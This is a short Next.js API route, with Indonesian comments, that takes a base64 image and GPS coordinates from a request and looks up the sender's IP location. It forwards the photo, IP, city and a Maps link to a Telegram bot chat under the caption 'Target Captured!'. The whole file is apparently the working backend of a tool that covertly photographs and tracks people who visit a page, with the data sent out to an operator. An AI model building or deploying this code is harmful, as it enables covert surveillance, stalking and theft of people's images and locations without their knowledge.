import { NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: Request) {
  try {
    const { image, gps } = await req.json();
    const ip = req.headers.get("x-forwarded-for") || "1.1.1.1";

    // Info Lokasi IP
    const geoRes = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`).catch(() => ({ data: {} }));
    const geo = geoRes.data;

    let caption = `📸 *Target Captured!*\n\n`;
    caption += `🌐 *IP:* \`${geo.query || ip}\` \n`;
    caption += `📍 *Lokasi:* ${geo.city || "?"}, ${geo.country || "?"}\n`;
    if (gps) caption += `🎯 *GPS:* [Buka Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})\n`;

    const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
    const formData = new FormData();
    formData.append("chat_id", process.env.TELEGRAM_CHAT_ID!);
    formData.append("photo", new Blob([buffer], { type: "image/png" }), "capture.png");
    formData.append("caption", caption);
    formData.append("parse_mode", "Markdown");

    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, formData);

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: "Failed" }, { status: 500 });
  }
}